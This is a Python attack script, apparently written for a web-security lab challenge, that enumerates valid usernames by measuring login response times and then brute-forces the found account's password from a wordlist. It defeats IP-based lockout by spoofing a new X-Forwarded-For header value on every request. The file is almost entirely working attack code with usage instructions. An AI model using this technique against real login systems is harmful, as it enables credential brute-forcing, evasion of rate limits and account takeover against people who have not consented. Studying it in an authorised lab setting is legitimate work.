#!/usr/bin/env python3
# Username enumeration via response timing
# ----------------------------------------
# This `Challenge` used to block IP after numbers of invalid creds.
# To bypass this, I'm going to used `X-Forwarded-For` header.
# The header must be different everytime (when do the request).
# Example => X-Forwarded-For: 1
# Example => X-Forwarded-For: 2
# Example => X-Forwarded-For: 3, and so on.
# ----------------------------------------
# Pay close intention on the `request` time.
# BABI SIAL SUSAH GILEWWW....
# Make sure. Run it multiple times, to get the consitent reading
# Of the `request` time `user`.
# ----------------------------------------
# MUST CHANGE `count` & `req_time`
import requests
import sys
import time

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
   
def get_user(url, user_path, number):
    with open(user_path, 'r') as f:
        count = int(number)
        for users in f.readlines():
            user = users.replace('\n','')
            data = {'username':user, 'password':'superfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelieveme'}
            header = {'X-Forwarded-For':str(count)}
            start = time.perf_counter()
            requests.post(url, headers=header, data=data, verify=False, proxies=p, timeout=start)
            req_time = time.perf_counter() - start
            if req_time > 1.4:
                #return user + ", " + str(req_time) + ", Time: {0:.0f}ms".format(req_time)
                return user
            count += 1
            continue
        return False

def get_password(url, user, pass_path, number):
    with open(pass_path, 'r') as f:
        count = int(number) + 100
        for passwords in f.readlines():
            password = passwords.replace('\n','')
            data = {'username':user, 'password':password}
            header = {'X-Forwarded-For':str(count)}
            req = requests.post(url, headers=header, data=data, verify=False, proxies=p)
            if "Invalid username or password." not in req.text:
                return password
            count += 1
            continue
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        username = sys.argv[2].strip()
        password = sys.argv[3].strip()
        number = sys.argv[4].strip()
    except IndexError:
        print("[-] Usage: {} <url> <usenames> <passwords> <int:number>".format(sys.argv[0]))
        print('[-] Example: {} "http://example.com" usernames.txt passwords.txt "100"'.format(sys.argv[0]))
        sys.exit(1)

    print("[+] Enumerate the username...")
    user = get_user(url, username, int(number))
    if user:
        print(f"[-] Found the username...   [{user}]")
        print("[+] Enumerate the password...")
        passwd = get_password(url, user, password, int(number))
        if passwd:
            print(f"[-] Found the password...   [{passwd}]")

    
    #with open(username, 'r') as f:
    #    count = 5400
    #    for users in f.readlines():
    #        user = users.replace('\n','')
    #        data = {'username':user, 'password':'superfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelievemesuperfrickinglongpasswordpleasebelieveme'}
    #        header = {'X-Forwarded-For':str(count)}
    #        start = time.perf_counter()
    #        requests.post(url, headers=header, data=data, verify=False, proxies=p, timeout=start)
    #        req_time = time.perf_counter() - start
    #        print(user + ", " + str(req_time) + ", Time: {0:.0f}ms".format(req_time))
    #        count += 1